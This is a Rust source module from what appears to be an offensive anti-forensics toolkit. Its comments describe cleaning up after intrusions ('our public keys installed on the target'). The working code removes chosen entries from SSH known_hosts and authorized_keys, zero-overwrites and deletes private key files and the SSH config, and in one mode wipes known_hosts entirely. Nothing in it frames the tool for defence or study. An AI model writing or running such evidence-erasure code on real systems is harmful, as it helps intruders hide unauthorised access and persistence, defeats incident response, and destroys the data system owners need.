/*
 * ssh_clean.rs — SSH artifact removal
 *
 * Forensic artifacts left by SSH:
 *  - known_hosts    : IP/hostname → host key mappings (reveals where we connected)
 *  - authorized_keys: our public keys installed on the target (persistence evidence)
 *  - id_* keys      : private keys (if we generated them on the target)
 *  - .ssh/config    : reveals targets and proxy chains
 *  - auth.log       : handled by log_poison
 *
 * COVER mode: remove specific entries (by IP/hostname) from known_hosts
 * DESTROY mode: zero the entire file
 */

use std::fs::{self, OpenOptions};
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use crate::Result;

// ── known_hosts ───────────────────────────────────────────────────────────────

/// Remove all lines matching any of the given hosts from known_hosts.
/// Handles both plain and hashed (|1|...) format entries.
pub fn known_hosts_remove(path: &str, hosts: &[&str]) -> Result<usize> {
    let content = match fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(0),
        Err(e) => return Err(e.to_string()),
    };

    let mut removed = 0usize;
    let mut out = Vec::new();

    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            out.push(line.to_string());
            continue;
        }

        // First field: comma-separated hostnames/IPs (or |1|salt|hash for hashed)
        let host_field = line.split_whitespace().next().unwrap_or("");

        let drop = hosts.iter().any(|h| {
            host_field.split(',').any(|entry| {
                // Strip [brackets] and :port for comparison
                let clean = entry.trim_start_matches('[')
                    .split(']').next().unwrap_or(entry)
                    .split(':').next().unwrap_or(entry);
                clean == *h || entry == *h
            })
        });

        if drop {
            removed += 1;
        } else {
            out.push(line.to_string());
        }
    }

    let tmp = format!("{}.s2tmp", path);
    let mut f = OpenOptions::new()
        .write(true).create(true).truncate(true)
        .open(&tmp)
        .map_err(|e| e.to_string())?;

    for line in &out {
        writeln!(f, "{}", line).map_err(|e| e.to_string())?;
    }

    if let Ok(meta) = fs::metadata(path) {
        let _ = fs::set_permissions(&tmp,
            fs::Permissions::from_mode(meta.permissions().mode()));
    }

    fs::rename(&tmp, path).map_err(|e| { let _ = fs::remove_file(&tmp); e.to_string() })?;
    Ok(removed)
}

/// Wipe the entire known_hosts file (zero + truncate).
pub fn known_hosts_destroy(path: &str) -> Result<()> {
    crate::secure_zero_file(path)
}

// ── authorized_keys ───────────────────────────────────────────────────────────

/// Remove specific key entries from authorized_keys by matching comment or key fragment.
pub fn authorized_keys_remove(path: &str, fragments: &[&str]) -> Result<usize> {
    let content = match fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(0),
        Err(e) => return Err(e.to_string()),
    };

    let mut removed = 0usize;
    let mut out = Vec::new();

    for line in content.lines() {
        let drop = fragments.iter().any(|f| line.contains(f));
        if drop { removed += 1; } else { out.push(line); }
    }

    let tmp = format!("{}.s2tmp", path);
    let mut f = OpenOptions::new()
        .write(true).create(true).truncate(true)
        .open(&tmp)
        .map_err(|e| e.to_string())?;
    for line in &out { writeln!(f, "{}", line).map_err(|e| e.to_string())?; }
    if let Ok(meta) = fs::metadata(path) {
        let _ = fs::set_permissions(&tmp,
            fs::Permissions::from_mode(meta.permissions().mode()));
    }
    fs::rename(&tmp, path).map_err(|e| { let _ = fs::remove_file(&tmp); e.to_string() })?;
    Ok(removed)
}

// ── Key files ─────────────────────────────────────────────────────────────────

/// Overwrite and delete private key files in ~/.ssh/
pub fn wipe_ssh_keys(ssh_dir: &Path) -> Result<u32> {
    let mut wiped = 0u32;
    let key_patterns = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"];

    for name in &key_patterns {
        let priv_key = ssh_dir.join(name);
        let pub_key  = ssh_dir.join(format!("{}.pub", name));

        for p in &[&priv_key, &pub_key] {
            if p.exists() {
                if crate::secure_zero_file(p.to_str().unwrap_or("")).is_ok() {
                    let _ = fs::remove_file(p);
                    wiped += 1;
                }
            }
        }
    }
    Ok(wiped)
}

// ── SSH config ────────────────────────────────────────────────────────────────

pub fn wipe_ssh_config(ssh_dir: &Path) -> Result<()> {
    let config = ssh_dir.join("config");
    if config.exists() {
        crate::secure_zero_file(config.to_str().unwrap_or(""))?;
    }
    Ok(())
}

// ── Public API ────────────────────────────────────────────────────────────────

#[derive(Debug, Default)]
pub struct SshCleanStats {
    pub known_hosts_removed: usize,
    pub auth_keys_removed:   usize,
    pub keys_wiped:          u32,
    pub errors:              u32,
}

pub struct SshCleanOpts<'a> {
    /// COVER: remove only entries matching these hosts; DESTROY: wipe all
    pub hosts:          &'a [&'a str],
    /// Key comment fragments to remove from authorized_keys
    pub key_fragments:  &'a [&'a str],
    pub destroy_all:    bool,
    pub wipe_keys:      bool,
    pub wipe_config:    bool,
}

pub fn ssh_clean(opts: &SshCleanOpts, stats: &mut SshCleanStats) -> Result<()> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let ssh_dir = PathBuf::from(&home).join(".ssh");

    if !ssh_dir.exists() {
        eprintln!("[*] ssh_clean: {} does not exist", ssh_dir.display());
        return Ok(());
    }

    let known_hosts = ssh_dir.join("known_hosts");
    let known_hosts_str = known_hosts.to_str().unwrap_or("");

    if opts.destroy_all {
        if known_hosts.exists() {
            match known_hosts_destroy(known_hosts_str) {
                Ok(()) => { eprintln!("[+] ssh: known_hosts zeroed"); }
                Err(e) => { eprintln!("[!] ssh: known_hosts: {}", e); stats.errors += 1; }
            }
        }
    } else if !opts.hosts.is_empty() {
        match known_hosts_remove(known_hosts_str, opts.hosts) {
            Ok(n) => {
                stats.known_hosts_removed = n;
                eprintln!("[+] ssh: {} known_hosts entry/entries removed", n);
            }
            Err(e) => { eprintln!("[!] ssh: known_hosts: {}", e); stats.errors += 1; }
        }
    }

    let auth_keys = ssh_dir.join("authorized_keys");
    if auth_keys.exists() && !opts.key_fragments.is_empty() {
        match authorized_keys_remove(auth_keys.to_str().unwrap_or(""), opts.key_fragments) {
            Ok(n) => {
                stats.auth_keys_removed = n;
                eprintln!("[+] ssh: {} authorized_keys entry/entries removed", n);
            }
            Err(e) => { eprintln!("[!] ssh: authorized_keys: {}", e); stats.errors += 1; }
        }
    }

    if opts.wipe_keys {
        match wipe_ssh_keys(&ssh_dir) {
            Ok(n) => {
                stats.keys_wiped = n;
                eprintln!("[+] ssh: {} key file(s) wiped", n);
            }
            Err(e) => { eprintln!("[!] ssh: key wipe: {}", e); stats.errors += 1; }
        }
    }

    if opts.wipe_config {
        if let Err(e) = wipe_ssh_config(&ssh_dir) {
            eprintln!("[!] ssh: config wipe: {}", e);
            stats.errors += 1;
        }
    }

    Ok(())
}
